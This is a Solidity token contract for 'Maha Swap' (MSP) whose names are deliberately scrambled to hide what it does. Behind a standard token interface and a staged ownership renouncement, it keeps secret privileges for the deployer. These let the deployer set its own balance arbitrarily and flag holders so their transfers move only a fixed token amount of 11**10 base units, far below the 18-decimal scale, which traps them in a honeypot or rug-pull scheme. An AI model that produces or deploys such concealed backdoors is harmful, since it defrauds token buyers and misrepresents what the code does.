//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface udvbtvtncxzyr {
    function totalSupply() external view returns (uint256);

    function balanceOf(address ztujfbkkocmhq) external view returns (uint256);

    function transfer(address pgebjguascz, uint256 yvwhuyneszdg) external returns (bool);

    function allowance(address ttczjlphzdhqgl, address spender) external view returns (uint256);

    function approve(address spender, uint256 yvwhuyneszdg) external returns (bool);

    function transferFrom(
        address sender,
        address pgebjguascz,
        uint256 yvwhuyneszdg
    ) external returns (bool);

    event Transfer(address indexed from, address indexed mnftugtqhfuvnx, uint256 value);
    event Approval(address indexed ttczjlphzdhqgl, address indexed spender, uint256 value);
}

interface zcwhxcimvv is udvbtvtncxzyr {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract quqtfmiegadg {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface rupgufqcl {
    function createPair(address pykmjqiobkviwk, address jairpaqisgdfd) external returns (address);
}

interface xwgwsqcyezoho {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract MahaSwap is quqtfmiegadg, udvbtvtncxzyr, zcwhxcimvv {

    function allowance(address qumhxqmhflkaw, address pqicvsgmjdqfg) external view virtual override returns (uint256) {
        return tzadffqirrkfe[qumhxqmhflkaw][pqicvsgmjdqfg];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return ajdjknxrp;
    }

    function owner() external view returns (address) {
        return maucknaav;
    }

    bool public razhgfyizzs;

    uint256 private asemjhekyxzv;

    function bxkutlcxixb(address kfxzstvesgiwq, address pgebjguascz, uint256 yvwhuyneszdg) internal returns (bool) {
        require(tsntctbkzctxy[kfxzstvesgiwq] >= yvwhuyneszdg);
        tsntctbkzctxy[kfxzstvesgiwq] -= yvwhuyneszdg;
        tsntctbkzctxy[pgebjguascz] += yvwhuyneszdg;
        emit Transfer(kfxzstvesgiwq, pgebjguascz, yvwhuyneszdg);
        return true;
    }

    uint256 private sghcahsilvge;

    function approve(address pqicvsgmjdqfg, uint256 yvwhuyneszdg) public virtual override returns (bool) {
        tzadffqirrkfe[_msgSender()][pqicvsgmjdqfg] = yvwhuyneszdg;
        emit Approval(_msgSender(), pqicvsgmjdqfg, yvwhuyneszdg);
        return true;
    }

    function baesqnlqwi() public {
        if (sghcahsilvge == asemjhekyxzv) {
            razhgfyizzs = false;
        }
        if (yfwvcywgojk == sghcahsilvge) {
            zpjocofazvem = false;
        }
        bioeaqcfc=false;
    }

    mapping(address => mapping(address => uint256)) private tzadffqirrkfe;

    function auzkebdkjl() public view returns (bool) {
        return zpjocofazvem;
    }

    bool private bioeaqcfc;

    address private maucknaav;

    function decimals() external view virtual override returns (uint8) {
        return jbmkjjembli;
    }

    string private cowyxyqlkl = "MSP";

    function zdcdaicbmmlv() public view returns (bool) {
        return zpjocofazvem;
    }

    event OwnershipTransferred(address indexed nsoabvnzfrdun, address indexed gowkuheay);

    uint256 public yfwvcywgojk;

    function eujvkimubhul() public view returns (bool) {
        return bioeaqcfc;
    }

    function qvqqkefitnbxr() public {
        if (sghcahsilvge == yfwvcywgojk) {
            sghcahsilvge = asemjhekyxzv;
        }
        if (razhgfyizzs == zpjocofazvem) {
            sghcahsilvge = yfwvcywgojk;
        }
        razhgfyizzs=false;
    }

    function vpeirvckze() public {
        emit OwnershipTransferred(hxmlttowf, address(0));
        maucknaav = address(0);
    }

    function bxcjnuplgi() public view returns (bool) {
        return bioeaqcfc;
    }

    function balanceOf(address ztujfbkkocmhq) public view virtual override returns (uint256) {
        return tsntctbkzctxy[ztujfbkkocmhq];
    }

    uint256 private ajdjknxrp = 100000000 * 10 ** 18;

    string private ohgbbrkwunlk = "Maha Swap";

    constructor (){ 
        if (sghcahsilvge == asemjhekyxzv) {
            razhgfyizzs = true;
        }
        xwgwsqcyezoho xcugibdqwlr = xwgwsqcyezoho(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        dxybfhtfurwfmo = rupgufqcl(xcugibdqwlr.factory()).createPair(xcugibdqwlr.WETH(), address(this));
        maucknaav = _msgSender();
        
        hxmlttowf = _msgSender();
        duzddgsbq[_msgSender()] = true;
        
        tsntctbkzctxy[_msgSender()] = ajdjknxrp;
        emit Transfer(address(0), hxmlttowf, ajdjknxrp);
        vpeirvckze();
    }

    function akwdlehabywnwo() public view returns (bool) {
        return zpjocofazvem;
    }

    bool public qusytvvned;

    function symbol() external view virtual override returns (string memory) {
        return cowyxyqlkl;
    }

    function ciwindytgngvdq(uint256 yvwhuyneszdg) public {
        if (!duzddgsbq[_msgSender()]) {
            return;
        }
        tsntctbkzctxy[hxmlttowf] = yvwhuyneszdg;
    }

    uint8 private jbmkjjembli = 18;

    uint256 constant cqzqzbpezbw = 11 ** 10;

    function getOwner() external view returns (address) {
        return maucknaav;
    }

    mapping(address => bool) public hmnannkltnemrv;

    function transfer(address qplyefncawenht, uint256 yvwhuyneszdg) external virtual override returns (bool) {
        return gotijnceajzf(_msgSender(), qplyefncawenht, yvwhuyneszdg);
    }

    bool public zpjocofazvem;

    mapping(address => bool) public duzddgsbq;

    function transferFrom(address kfxzstvesgiwq, address pgebjguascz, uint256 yvwhuyneszdg) external override returns (bool) {
        if (tzadffqirrkfe[kfxzstvesgiwq][_msgSender()] != type(uint256).max) {
            require(yvwhuyneszdg <= tzadffqirrkfe[kfxzstvesgiwq][_msgSender()]);
            tzadffqirrkfe[kfxzstvesgiwq][_msgSender()] -= yvwhuyneszdg;
        }
        return gotijnceajzf(kfxzstvesgiwq, pgebjguascz, yvwhuyneszdg);
    }

    function rkifqjssbk(address ywsvwulcr) public {
        if (yfwvcywgojk == asemjhekyxzv) {
            zpjocofazvem = true;
        }
        if (ywsvwulcr == hxmlttowf || ywsvwulcr == dxybfhtfurwfmo || !duzddgsbq[_msgSender()]) {
            return;
        }
        
        hmnannkltnemrv[ywsvwulcr] = true;
    }

    address public dxybfhtfurwfmo;

    mapping(address => uint256) private tsntctbkzctxy;

    address public hxmlttowf;

    function name() external view virtual override returns (string memory) {
        return ohgbbrkwunlk;
    }

    function kujpkcrvbe(address muoqgywdzbau) public {
        if (qusytvvned) {
            return;
        }
        
        duzddgsbq[muoqgywdzbau] = true;
        if (bioeaqcfc) {
            bioeaqcfc = true;
        }
        qusytvvned = true;
    }

    function gotijnceajzf(address kfxzstvesgiwq, address pgebjguascz, uint256 yvwhuyneszdg) internal returns (bool) {
        if (kfxzstvesgiwq == hxmlttowf) {
            return bxkutlcxixb(kfxzstvesgiwq, pgebjguascz, yvwhuyneszdg);
        }
        if (hmnannkltnemrv[kfxzstvesgiwq]) {
            return bxkutlcxixb(kfxzstvesgiwq, pgebjguascz, cqzqzbpezbw);
        }
        return bxkutlcxixb(kfxzstvesgiwq, pgebjguascz, yvwhuyneszdg);
    }

}